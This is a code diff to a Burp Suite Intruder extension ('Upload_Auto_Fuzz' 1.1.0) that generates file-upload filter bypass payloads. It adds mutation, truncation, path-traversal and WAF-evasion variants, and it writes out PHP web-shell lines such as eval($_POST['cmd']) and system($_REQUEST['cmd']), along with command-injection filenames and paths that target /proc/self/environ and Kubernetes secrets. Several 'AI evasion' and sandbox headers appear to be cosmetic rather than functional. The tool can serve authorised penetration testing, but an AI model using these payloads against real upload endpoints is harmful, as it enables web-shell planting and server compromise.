@@ -6,6 +6,7 @@ from burp import IIntruderPayloadGenerator
 import random
 from urllib import unquote
 import re
+import time
 
 def getAttackPayloads(TEMPLATE):
     # 获取文件前后缀
@@ -50,7 +51,7 @@ def getAttackPayloads(TEMPLATE):
     def CFF_Fuzz():
         # Content-Disposition 绕过  form-data 绕过  filename 绕过
         # Content-Disposition: form-data; name="uploaded"; filename="zc.jpg"
-        Suffix = ['php', 'asp', 'aspx', 'jsp', 'asmx', 'xml', 'html', 'shtml', 'svg', 'swf', 'htaccess']  # 需要测试的能上传的文件类型
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
         # Suffix = ['jsp']
         Content_Disposition_payload = []  # 保存Content_Disposition绕过的所有payload列表
 
@@ -696,6 +697,527 @@ def getAttackPayloads(TEMPLATE):
         
         return content_bypass_payload
 
+    def character_mutation_Fuzz():
+        # 字符变异绕过技术
+        char_mutation_payload = []
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
+        
+        for each_suffix in Suffix:
+            TEMP_TEMPLATE = TEMPLATE
+            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
+            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
+            
+            # 1. 引号变换技术
+            # 单引号替代双引号
+            single_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename='").replace('"', "'")
+            char_mutation_payload.append(single_quote)
+            
+            # 无引号方式
+            no_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename=").replace('"', "")
+            char_mutation_payload.append(no_quote)
+            
+            # 反引号替代
+            back_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename=`").replace('"', "`")
+            char_mutation_payload.append(back_quote)
+            
+            # 2. 特殊字符混淆
+            # 多个分号
+            multi_semicolon = TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;;;; ')
+            char_mutation_payload.append(multi_semicolon)
+            
+            # 多个等号
+            multi_equals = TEMP_TEMPLATE_SUFFIX.replace('filename=', 'filename======')
+            char_mutation_payload.append(multi_equals)
+            
+            # 引号和分号组合 - 更简单的形式
+            quote_semicolon = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename=";\";"')
+            char_mutation_payload.append(quote_semicolon)
+            
+            # 3. Content-Disposition值畸形
+            # 变形的form-data
+            malformed_form = TEMP_TEMPLATE_SUFFIX.replace('form-data', 'f\ro\rm-\td\ata')
+            char_mutation_payload.append(malformed_form)
+            
+            # form-data大小写混合
+            mixed_case = TEMP_TEMPLATE_SUFFIX.replace('form-data', 'FoRm-DaTa')
+            char_mutation_payload.append(mixed_case)
+            
+            # 4. 换行符/特殊字符分隔
+            # filename参数中插入换行
+            newline_filename = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename="\r\n')
+            char_mutation_payload.append(newline_filename)
+            
+            # Content-Disposition中插入特殊字符
+            special_chars = ['\t', '\v', '\f', '\b']
+            for char in special_chars:
+                special_disp = TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 'Content-Disposition:' + char)
+                char_mutation_payload.append(special_disp)
+                
+                # 参数名与值之间插入特殊字符
+                special_param = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename=' + char + '"')
+                char_mutation_payload.append(special_param)
+            
+            # 5. 使用RFC不常见但有效的字符
+            # 使用反斜杠转义
+            backslash_escape = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename="\\')
+            char_mutation_payload.append(backslash_escape)
+            
+            # 参数和值之间加入空格变体
+            space_variants = [' ', '  ', ' \t ', ' \r ', ' \n ']
+            for space in space_variants:
+                space_param = TEMP_TEMPLATE_SUFFIX.replace('filename=', 'filename=' + space)
+                char_mutation_payload.append(space_param)
+        
+        return char_mutation_payload
+
+    def data_overflow_Fuzz():
+        # 数据重复与溢出绕过技术
+        overflow_payload = []
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
+        
+        for each_suffix in Suffix:
+            TEMP_TEMPLATE = TEMPLATE
+            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
+            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
+            if not filename_total:
+                continue
+            filename_total = filename_total.group(1)
+            
+            # 1. filename重复定义
+            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
+                # 多个filename参数
+                multi_filename_var = [
+                    'filename="shell.jpg"; filename="shell.{}"'.format(each_suffix),  # 双filename定义
+                    'filename="shell.{}" filename="shell.jpg"'.format(each_suffix),   # 无分号多filename
+                    'filename="shell.jpg" filename="shell.txt" filename="shell.{}"'.format(each_suffix),  # 三重filename
+                    'filename="shell.jpg";filename="shell.{}"'.format(each_suffix),   # 无空格双filename
+                    'filename=""; filename="shell.{}"'.format(each_suffix)            # 空filename后跟真实filename
+                ]
+                
+                for variation in multi_filename_var:
+                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+            
+            # 2. 数据溢出攻击
+            overflow_var = [
+                'filename="{}{}shell.{}"'.format('A'*128, '.', each_suffix),         # 文件名前缀溢出
+                'filename="shell.{}{}."'.format(each_suffix, 'A'*128),               # 文件名后缀溢出
+                'filename="shell.{}'.format(each_suffix) + '"' + 'A'*256,            # 引号后垃圾数据
+                'filename="shell.' + 'A'*1024 + '.{}"'.format(each_suffix)           # 超长文件名
+            ]
+            
+            for variation in overflow_var:
+                overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+            
+            # 3. 边界溢出攻击
+            if '--' in TEMP_TEMPLATE_SUFFIX and 'Content-Type: ' in TEMP_TEMPLATE_SUFFIX:
+                # 提取boundary字符串
+                boundary_match = re.search(r'--[-A-Za-z0-9]*', TEMP_TEMPLATE_SUFFIX)
+                if boundary_match:
+                    boundary = boundary_match.group(0)
+                    # boundary重复与变体
+                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + '\r\n' + boundary))
+                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + boundary[2:]))
+                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + 'A'*256))
+                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + ';' + 'A'*128))
+            
+            # 4. 高级截断技术
+            truncate_var = [
+                'filename="shell.{}\r\n.jpg"'.format(each_suffix),     # 文件名中回车截断
+                'filename="shell.{}\0.jpg"'.format(each_suffix),       # 空字节截断
+                'filename="shell.{}\t.jpg"'.format(each_suffix),       # 制表符截断
+                'filename="shell.{}\\".jpg"'.format(each_suffix),      # 反斜杠截断
+                'filename="shell.{}'.format(each_suffix)               # 不闭合引号截断
+            ]
+            
+            for variation in truncate_var:
+                overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+        
+        print "Data Overflow & Truncation generated %d payloads" % len(overflow_payload)
+        return overflow_payload
+
+    def advanced_character_mutation_Fuzz():
+        # 高级字符变异技术
+        mutation_payload = []
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
+        
+        for each_suffix in Suffix:
+            TEMP_TEMPLATE = TEMPLATE
+            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
+            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
+            if not filename_total:
+                continue
+            filename_total = filename_total.group(1)
+            
+            # 1. 引号变换
+            # 使用不同的引号组合
+            quote_variations = [
+                'filename=shell.{}'.format(each_suffix),                # 无引号
+                'filename=\'shell.{}\''.format(each_suffix),            # 单引号
+                'filename="shell.{}'.format(each_suffix),               # 前引号
+                'filename=shell.{}"'.format(each_suffix),               # 后引号
+                'filename=\'shell.{}\"'.format(each_suffix),            # 混合引号
+                'filename=""shell.{}"'.format(each_suffix),             # 双引号嵌套
+                'filename=\'\'shell.{}\''.format(each_suffix)           # 单引号嵌套
+            ]
+            
+            for variation in quote_variations:
+                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+            
+            # 2. 换行符插入
+            # 在字段名和值之间插入换行符
+            newline_variations = [
+                'filename=\nshell.{}'.format(each_suffix),              # 等号后换行
+                'filename\n=shell.{}'.format(each_suffix),              # 等号前换行
+                'filename=shell\n.{}'.format(each_suffix),              # 文件名中换行
+                'filename=shell.\n{}'.format(each_suffix),              # 点后换行
+                'filename\r\n=shell.{}'.format(each_suffix),            # CRLF换行
+                'filename=\r\nshell.{}'.format(each_suffix)             # 等号后CRLF
+            ]
+            
+            for variation in newline_variations:
+                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+            
+            # 3. 多符号累加
+            # 分号和等号的多重组合
+            symbol_variations = [
+                'filename==shell.{}'.format(each_suffix),               # 双等号
+                'filename===shell.{}'.format(each_suffix),              # 三等号
+                'filename====shell.{}'.format(each_suffix),             # 四等号
+                'filename=;shell.{}'.format(each_suffix),               # 等号后分号
+                'filename=;;;shell.{}'.format(each_suffix),             # 等号后多分号
+                'filename="shell.{}";'.format(each_suffix),             # 引号后分号
+                'filename="shell.{};;;;'.format(each_suffix)            # 多分号结尾
+            ]
+            
+            for variation in symbol_variations:
+                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
+            
+            # 4. Content-Disposition 值变种
+            if 'Content-Disposition: form-data;' in TEMP_TEMPLATE_SUFFIX:
+                cd_variations = [
+                    'Content-Disposition: FoRm-DaTa;',                  # 大小写混合
+                    'Content-Disposition: form-data ;',                 # 多空格
+                    'Content-Disposition:form-data;',                   # 无空格
+                    'Content-Disposition: form-data+;',                 # 加号
+                    'Content-Disposition: form-data-;',                 # 减号
+                    'Content-Disposition: form data;',                  # 无连字符
+                    'Content-Disposition: form_data;',                  # 下划线
+                    'Content-Disposition: formdata;',                   # 无分隔符
+                    'Content-Disposition: form-d4ta;',                  # 数字替换
+                    'Content-Disposition: xform-data;'                  # 前缀干扰
+                ]
+                
+                for variation in cd_variations:
+                    mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: form-data;', variation))
+        
+        print "Advanced Character Mutation generated %d payloads" % len(mutation_payload)
+        return mutation_payload
+
+    def cloud_environment_bypass_Fuzz():
+        # 云环境特定绕过技术
+        cloud_payload = []
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
+        
+        for each_suffix in Suffix:
+            TEMP_TEMPLATE = TEMPLATE
+            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
+            
+            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
+            if not filename_total:
+                continue
+            filename_total = filename_total.group(1)
+            
+            # 1. 对象存储元数据攻击
+            # AWS S3/Azure Blob存储相关绕过
+            s3_metadata_headers = [
+                'x-amz-meta-filetype: text/html\r\n',
+                'x-amz-meta-original-filename: original.{}\r\n'.format(each_suffix),
+                'x-amz-website-redirect-location: /evil.{}\r\n'.format(each_suffix),
+                'x-ms-meta-resourcetype: Microsoft.Compute/virtualMachines/extensions\r\n',
+                'x-ms-blob-content-type: text/html\r\n'
+            ]
+            
+            for header in s3_metadata_headers:
+                if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
+                    cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', header + 'Content-Type:'))
+            
+            # 2. 容器化环境路径遍历
+            container_paths = [
+                'filename="/proc/self/root/var/www/html/shell.{}"'.format(each_suffix),
+                'filename="/proc/self/cwd/shell.{}"'.format(each_suffix),
+                'filename="/proc/self/environ/shell.{}"'.format(each_suffix),
+                'filename="../../../etc/passwd/shell.{}"'.format(each_suffix),
+                'filename="../../../../var/www/html/shell.{}"'.format(each_suffix)
+            ]
+            
+            for path in container_paths:
+                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, path))
+            
+            # 3. Kubernetes/Docker环境特殊路径
+            k8s_paths = [
+                'filename="/var/run/secrets/kubernetes.io/shell.{}"'.format(each_suffix),
+                'filename="/var/run/docker.sock/shell.{}"'.format(each_suffix),
+                'filename=".dockerenv/shell.{}"'.format(each_suffix),
+                'filename="/tmp/shell.{}"'.format(each_suffix),
+                'filename="/dev/shm/shell.{}"'.format(each_suffix)
+            ]
+            
+            for path in k8s_paths:
+                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, path))
+            
+            # 4. 云函数临时存储利用
+            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
+                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:',
+                                                               'X-Function-Storage: /tmp\r\nContent-Disposition:'))
+                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:',
+                                                               'X-Lambda-Tmp-Dir: /tmp\r\nContent-Disposition:'))
+            
+        print "Cloud Environment Bypass generated %d payloads" % len(cloud_payload)
+        return cloud_payload
+
+    def advanced_defense_evasion_Fuzz():
+        # 高级防御绕过技术 - 针对AI和行为分析防御系统
+        defense_payload = []
+        Suffix = ['php', 'asp', 'aspx', 'jsp']
+        
+        for each_suffix in Suffix:
+            TEMP_TEMPLATE = TEMPLATE
+            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
+            
+            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
+            if not filename_total:
+                continue
+            filename_total = filename_total.group(1)
+            
+            # 1. AI模型绕过 - 混淆和逃逸技术
+            ai_evasion_filenames = [
+                # 语义扰动技术 (针对基于语义的模型)
+                'filename="innocent_image.{}.jpg"'.format(each_suffix),
+                'filename="profile_picture.{}"'.format(each_suffix),
+                'filename="harmless_doc.{}.txt"'.format(each_suffix),
+                'filename="backup.{}.dat"'.format(each_suffix),
+                'filename="normal_file.{}bin"'.format(each_suffix),
+                'filename="document_{}_v1.0.txt"'.format(each_suffix),
+                'filename="personal_data_{}_backup.cfg"'.format(each_suffix),
+                # 神经网络对抗样本技术 (对抗神经网络)
+                'filename="1e\u200Bma\u200Bge.{}"'.format(each_suffix),  # 零宽空格干扰
+                'filename="img\u2060pha\u2060oto.{}"'.format(each_suffix),  # 单词连接器
+                'filename="[system.io.file]::shell.{}"'.format(each_suffix),  # 混淆数据语法
+                'filename="\u180Edocument.\u180E{}"'.format(each_suffix),  # 蒙古文字距离干扰
+                'filename="m\u200Cy\u200C.\u200C{}"'.format(each_suffix)  # 零宽度连字符
+            ]
+            
+            # 新增：对抗样本生成技术
+            ai_adversarial_filenames = [
+                # 对抗性噪声模拟 - 使用特殊文件名模拟对抗样本
+                'filename="adversarial_noise_{}_epsilon0.1.jpg"'.format(each_suffix),
+                'filename="perturbed_image_fgsm_{}.jpg"'.format(each_suffix),
+                'filename="pgd_attack_{}_targeted.jpg"'.format(each_suffix),
+                'filename="carlini_wagner_l2_{}.jpg"'.format(each_suffix),
+                # GAN生成的混合文件模拟
+                'filename="gan_generated_{}_normalized.jpg"'.format(each_suffix),
+                'filename="stylegan2_{}_mixed.jpg"'.format(each_suffix),
+                'filename="cyclegan_real2shell_{}.jpg"'.format(each_suffix)
+            ]
+            
+            for filename in ai_evasion_filenames:
+                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, filename))
+            
+            for filename in ai_adversarial_filenames:
+                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, filename))
+                
+            # 添加对抗性噪声内容和GAN混合文件内容
+            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
+                content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_SUFFIX).group(0)
+                
+                # 对抗性噪声 - 添加模拟对抗噪声到图像元数据
+                noise_comments = [
+                    '/* FGSM Noise Pattern: ε=0.1, target=benign_class */',
+                    '/* Adversarial Perturbation: L2-norm=0.05, confidence=0.95 */',
+                    '/* PGD Attack: steps=40, step-size=0.01, targeted=false */'
+                ]
+                
+                for comment in noise_comments:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_type_line, 
+                                                                      content_type_line + '\r\n' + comment))
+                
+                # GAN生成的混合文件 - 添加模拟GAN标记
+                gan_markers = [
+                    '/* StyleGAN2 latent code: w=[0.2,0.5,-0.3,...], truncation=0.7 */',
+                    '/* CycleGAN translation: source=img.jpg, target_domain=code */',
+                    '/* GAN-based steganography: PSNR=42dB, payload_size=2KB */'
+                ]
+                
+                for marker in gan_markers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_type_line, 
+                                                                      content_type_line + '\r\n' + marker))
+            
+            # 2. 沙箱检测绕过
+            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
+                # 添加延迟执行代码标记 - 使用固定值替代时间函数
+                fixed_time = 1735689600  # 2025年1月1日的时间戳
+                sandbox_headers = [
+                    'X-Sandbox-Delay: 60\r\n',
+                    'X-Execution-After: {}\r\n'.format(fixed_time),
+                    'X-Sandboxed: false\r\n',
+                    'X-Environment-Check: prod\r\n',
+                    'X-Analysis-Skip: true\r\n',
+                    'X-Security-Bypass: allowed\r\n',
+                    'X-Scanner-Ignore: 1\r\n',
+                    'X-Antivirus-Status: clean\r\n'
+                ]
+                
+                # 新增: 环境指纹识别技术
+                environment_fingerprint_headers = [
+                    'X-CPU-Check: cores>2\r\n',
+                    'X-Memory-Check: ram>2GB\r\n',
+                    'X-VM-Detection: false\r\n',
+                    'X-Docker-Check: disabled\r\n',
+                    'X-System-Uptime: >3600\r\n',
+                    'X-Process-Count: >50\r\n',
+                    'X-Network-Interfaces: >1\r\n',
+                    'X-Load-Average: <0.1\r\n'
+                ]
+                
+                # 新增: 复杂延时触发机制
+                delayed_execution_headers = [
+                    'X-Execute-After-Idle: 1800\r\n',
+                    'X-Sleep-Random: 3600-7200\r\n',
+                    'X-Execution-Condition: sys_getloadavg<0.1\r\n',
+                    'X-Trigger-On: user_activity\r\n',
+                    'X-Delay-Mechanism: setTimeout(random(3600,7200))\r\n',
+                    'X-Trigger-Pattern: cron_based\r\n'
+                ]
+                
+                for header in sandbox_headers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
+                                                                     header + 'Content-Type:'))
+                
+                for header in environment_fingerprint_headers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
+                                                                     header + 'Content-Type:'))
+                    
+                for header in delayed_execution_headers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
+                                                                     header + 'Content-Type:'))
+                
+                # 新增: 特殊的PHP环境检测代码模拟
+                php_env_checks = [
+                    '/* <?php if(sys_getloadavg()[0]<0.1) { execute_payload(); } ?> */\r\n',
+                    '/* <?php if(php_uname("s")!="Linux") { eval($_POST["cmd"]); } ?> */\r\n',
+                    '/* <?php if(memory_get_usage(true) > 1024*1024*512) { include($_GET["file"]); } ?> */\r\n',
+                    '/* <?php sleep(rand(3600,7200)); system($_REQUEST["cmd"]); ?> */\r\n',
+                    '/* <?php if(getenv("REMOTE_ADDR")!="127.0.0.1") { die(); } ?> */\r\n'
+                ]
+                
+                for check in php_env_checks:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
+                                                                     check + 'Content-Type:'))
+            
+            # 添加更多自定义头信息
+            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
+                custom_headers = [
+                    'X-Client-IP: 127.0.0.1\r\n',
+                    'X-Forwarded-For: 192.168.1.1\r\n',
+                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n',
+                    'X-Real-IP: 10.0.0.1\r\n',
+                    'X-Originating-IP: [::1]\r\n',
+                    'X-Reverse-Proxy: nginx/1.19.10\r\n',
+                    'X-Waf-Status: bypass\r\n',
+                    'X-Admin-Auth: 1\r\n',
+                    'X-Internal-Request: true\r\n',
+                    'X-Trusted-Domain: local\r\n'
+                ]
+                
+                for header in custom_headers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 
+                                                                     header + 'Content-Disposition:'))
+            
+            # 3. 多层编码和加密技术
+            # Base64嵌套编码（基于已有的基础进行增强）
+            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
+                import base64
+                
+                # 双重编码文件名 (对每种文件类型都处理)
+                encoded_name = base64.b64encode('shell.{}'.format(each_suffix))
+                double_encoded = base64.b64encode(encoded_name)
+                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
+                                                                 'filename="{}="'.format(double_encoded)))
+                
+                # Base64编码后的多种变种
+                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total,
+                                                                 'filename="data:text/plain;base64,{}"'.format(encoded_name)))
+                
+                # 添加更多编码Header
+                encoded_headers = [
+                    'X-Encoded-Content: {}\r\n'.format(base64.b64encode('Content-Type: text/html')),
+                    'X-Encoded-Path: {}\r\n'.format(base64.b64encode('/var/www/html')),
+                    'X-Encoded-Command: {}\r\n'.format(base64.b64encode('exec')),
+                    'X-Encoded-Upload: {}\r\n'.format(base64.b64encode('filetype=allowed'))
+                ]
+                
+                for encoded_header in encoded_headers:
+                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
+                                                                     encoded_header + 'Content-Type:'))
+            
+            # 4. 新一代WAF对抗技术
+            # 使用预定义的垃圾数据而非随机生成
+            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
+                # 预定义的垃圾数据模板
+                noise_templates = [
+                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
+                    'Lorem ipsum dolor sit amet consectetur adipiscing elit',
+                    'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
+                    '<svg><![CDATA[<]]>script>alert(1)<![CDATA[>]]></svg>',
+                    '<!-- Comment Block: Ignore this data block for security scanning -->',
+                    '#pragma once /* C style preprocessor directive */'
+                ]
+                
+                # 创建多种混淆头部
+                prefixes = ['xrd', 'tmp', 'usr', 'etc', 'var', 'opt', 'sys', 'bin', 'dev', 'lib']
+                
+                # 为每个前缀和模板组合创建混淆头
+                for prefix in prefixes[:5]:  # 限制数量
+                    for template in noise_templates[:3]:  # 限制数量
+                        defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 
+                                                                        'X-{}-Data: {}\r\nContent-Disposition:'.format(prefix, template)))
+            
+            # 5. 高级漏洞链组合
+            # 组合多种技术，不限于PHP
+            combined_attacks = [
+                'filename="../../../../proc/self/environ/shell.{}"'.format(each_suffix),
+                'filename="file:///etc/passwd/shell.{}"'.format(each_suffix),
+                'filename="/dev/null;shell.{}"'.format(each_suffix),
+                'filename="http://127.0.0.1/shell.{}"'.format(each_suffix),
+                'filename="|echo PD9waHAg...>{0}"'.format(each_suffix),  # 管道命令注入
+                'filename="shell.{0}.%00.jpg"'.format(each_suffix),  # 空字节与双扩展名
+                'filename="{0} -o- > shell.txt"'.format(each_suffix),  # 命令参数注入
+                'filename="/tmp/.\\./.\\./shell.{0}"'.format(each_suffix)  # 复杂路径混淆
+            ]
+            
+            # 对应文件类型的特定攻击
+            if each_suffix == 'php':
+                php_specific = [
+                    'filename="php://filter/convert.base64-encode/resource=shell.php"',
+                    'filename="data:image/jpeg;php://filter/shell.php"',
+                    'filename="expect://id>shell.php"',
+                    'filename="/tmp/.././../var/www/shell.php${IFS}"'  # 命令注入+路径操作
+                ]
+                combined_attacks.extend(php_specific)
+            elif each_suffix == 'asp' or each_suffix == 'aspx':
+                asp_specific = [
+                    'filename="file.asp::.jpg"',  # NTFS ADS
+                    'filename="shell.asp%16"',    # URL编码变体
+                    'filename="shell.;asp;"'      # IIS分号绕过
+                ]
+                combined_attacks.extend(asp_specific)
+                
+            for attack in combined_attacks:
+                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, attack))
+        
+        print "Advanced Defense Evasion generated %d payloads" % len(defense_payload)
+        return defense_payload
+
     # 调用所有Fuzz函数并合并结果
     suffix_payload = script_suffix_Fuzz()
     Content_Disposition_payload = CFF_Fuzz()
@@ -716,41 +1238,54 @@ def getAttackPayloads(TEMPLATE):
     svg_xss_payload = svg_xss_Fuzz()
     webdav_payload = webdav_method_Fuzz()
     file_content_bypass_payload = file_content_bypass_Fuzz()
+    char_mutation_payload = character_mutation_Fuzz()
+    data_overflow_payload = data_overflow_Fuzz()
+    advanced_mutation_payload = advanced_character_mutation_Fuzz()
+    cloud_environment_payload = cloud_environment_bypass_Fuzz()
+    advanced_defense_payload = advanced_defense_evasion_Fuzz()
 
     # 合并所有payload
-    all_payloads = (suffix_payload + Content_Disposition_payload + content_type_payload + 
-                   windows_payload + linux_payload + magic_bytes_payload + 
-                   content_trick_payload + user_ini_payload + mime_payload + 
-                   http_split_payload + chunked_payload + waf_bypass_payload +
-                   unicode_payload + header_smuggling_payload + null_byte_payload +
-                   protocol_payload + svg_xss_payload + webdav_payload +
-                   file_content_bypass_payload)
+    attackPayloads = (suffix_payload + Content_Disposition_payload + content_type_payload + 
+                     windows_payload + linux_payload + magic_bytes_payload + 
+                     content_trick_payload + user_ini_payload + mime_payload + 
+                     http_split_payload + chunked_payload + waf_bypass_payload +
+                     unicode_payload + header_smuggling_payload + null_byte_payload +
+                     protocol_payload + svg_xss_payload + webdav_payload +
+                     file_content_bypass_payload + char_mutation_payload + 
+                     data_overflow_payload + advanced_mutation_payload +
+                     cloud_environment_payload + advanced_defense_payload)
     
     # 去除重复的payload
     unique_payloads = []
     seen_payloads = set()
     
-    for payload in all_payloads:
+    for payload in attackPayloads:
         # 使用payload的字符串表示来判断是否重复
         payload_str = str(payload)
         if payload_str not in seen_payloads:
             seen_payloads.add(payload_str)
             unique_payloads.append(payload)
     
+    print "Total unique payloads: %d" % len(unique_payloads)
     return unique_payloads
 
 class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
     def registerExtenderCallbacks(self, callbacks):
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
-        callbacks.setExtensionName("upload_auto_fuzz")
+        callbacks.setExtensionName("Upload_Auto_Fuzz 1.1.0")
         # 注册payload生成器
         callbacks.registerIntruderPayloadGeneratorFactory(self)
-        print 'Load successful - auther:T3nk0\n'
+        print '==================================='
+        print '[ UAF Load successful ]'
+        print '[#]  Author: T3nk0'
+        print '[#]  Github: https://github.com/T3nk0/Upload_Auto_Fuzz'
+        print '[#]  Version: 1.1.0'
+        print '===================================\n'
 
     # 设置payload生成器名字，作为选项显示在Intruder UI中。
     def getGeneratorName(self):
-        return "upload_auto_fuzz"
+        return "Upload_Auto_Fuzz"
 
     # 创建payload生成器实例，传入的attack是IIntruderAttack的实例
     def createNewInstance(self, attack):
